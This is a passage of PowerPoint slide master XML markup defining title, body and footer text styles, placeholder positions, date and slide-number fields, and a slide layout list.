      <a:lvl2pPr marL="313781" indent="89652" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr marL="628964" indent="177903" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr marL="945547" indent="264754" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr marL="1260729" indent="353004" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl5pPr>
      <a:lvl6pPr marL="1577932">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl6pPr>
      <a:lvl7pPr marL="1893519">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl7pPr>
      <a:lvl8pPr marL="2209106">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl8pPr>
      <a:lvl9pPr marL="2524693">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl9pPr>
    </p:bodyStyle>
    <p:otherStyle>
      <a:lvl1pPr marL="0">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
      <a:lvl2pPr marL="315586">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr marL="631173">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr marL="946759">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr marL="1262346">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl5pPr>
      <a:lvl6pPr marL="1577932">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl6pPr>
      <a:lvl7pPr marL="1893519">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl7pPr>
      <a:lvl8pPr marL="2209106">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl8pPr>
      <a:lvl9pPr marL="2524693">
        <a:defRPr>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Holder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="940956" y="357188"/>
            <a:ext cx="1031009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p>
            <a:pPr lvl="0"/>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3075" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="902471" y="1193427"/>
            <a:ext cx="1038706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p>
            <a:pPr lvl="0"/>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4144818" y="6377548"/>
            <a:ext cx="3902364" cy="194702"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr" defTabSz="631543" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr sz="1235">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="6"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609986" y="6377548"/>
            <a:ext cx="2803621" cy="194702"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="l" defTabSz="631543" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr sz="1235">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{4501F347-A096-4C26-87DE-2FDC6EF4F842}" type="datetimeFigureOut">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="7"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8778394" y="6377548"/>
            <a:ext cx="2803622" cy="194702"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" numCol="1" anchor="t" anchorCtr="0" compatLnSpc="1">
            <a:prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="r" defTabSz="630365" eaLnBrk="1" hangingPunct="1">
              <a:defRPr sz="1235">
                <a:solidFill>
                  <a:srgbClr val="898989"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{96D1DCF1-3887-4CF6-9F5A-3123087E7889}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US">
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:pPr fontAlgn="base">
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPct val="0"/>
                </a:spcAft>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US">
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="313410586"/>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Lst>
  <p:txStyles>
    <p:titleStyle>
      <a:lvl1pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="+mj-lt"/>
          <a:ea typeface="+mj-ea"/>
          <a:cs typeface="+mj-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
      <a:lvl2pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl5pPr>
      <a:lvl6pPr marL="403079" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl6pPr>
      <a:lvl7pPr marL="806157" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl7pPr>
      <a:lvl8pPr marL="1209236" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl8pPr>
      <a:lvl9pPr marL="1612314" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl9pPr>
    </p:titleStyle>
    <p:bodyStyle>
      <a:lvl1pPr marL="302575" indent="-302575" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
      <a:lvl2pPr marL="313781" indent="89652" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr marL="630365" indent="176502" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr marL="945547" indent="264754" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr marL="1262130" indent="351604" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl5pPr>
      <a:lvl6pPr marL="1578858">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl6pPr>
      <a:lvl7pPr marL="1894630">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl7pPr>
      <a:lvl8pPr marL="2210402">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl8pPr>
      <a:lvl9pPr marL="2526174">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl9pPr>
    </p:bodyStyle>
    <p:otherStyle>
      <a:lvl1pPr marL="0">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
      <a:lvl2pPr marL="315771">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr marL="631543">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr marL="947315">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr marL="1263087">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl5pPr>
      <a:lvl6pPr marL="1578858">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl6pPr>
      <a:lvl7pPr marL="1894630">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl7pPr>
      <a:lvl8pPr marL="2210402">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl8pPr>
      <a:lvl9pPr marL="2526174">
        <a:defRPr>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Holder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="935182" y="717177"/>
            <a:ext cx="1032163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p>
            <a:pPr lvl="0"/>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1296940" y="2291603"/>
            <a:ext cx="9598121" cy="423193"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="2750" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4144818" y="6377549"/>
            <a:ext cx="3902364" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:tint val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="6"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609986" y="6377549"/>
            <a:ext cx="2803621" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="l" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:tint val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{DCD0172C-58E9-486D-A2AD-12C3CA838340}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="7"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8778394" y="6377549"/>
            <a:ext cx="2803622" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" numCol="1" anchor="t" anchorCtr="0" compatLnSpc="1">
            <a:prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="r" eaLnBrk="1" hangingPunct="1">
              <a:defRPr>
                <a:solidFill>
                  <a:srgbClr val="898989"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{4BEFF18A-0DE6-4E8B-B335-782E6B6B2D1E}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US">
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:pPr fontAlgn="base">
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPct val="0"/>
                </a:spcAft>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US">
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="982961856"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>
  <p:sldLayoutIdLst>
    <p:sldLayoutId id="2147483727" r:id="rId1"/>
    <p:sldLayoutId id="2147483728" r:id="rId2"/>
    <p:sldLayoutId id="2147483729" r:id="rId3"/>
    <p:sldLayoutId id="2147483730" r:id="rId4"/>
    <p:sldLayoutId id="2147483731" r:id="rId5"/>
  </p:sldLayoutIdLst>
  <p:txStyles>
    <p:titleStyle>
      <a:lvl1pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="+mj-lt"/>
          <a:ea typeface="+mj-ea"/>
          <a:cs typeface="+mj-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
      <a:lvl2pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
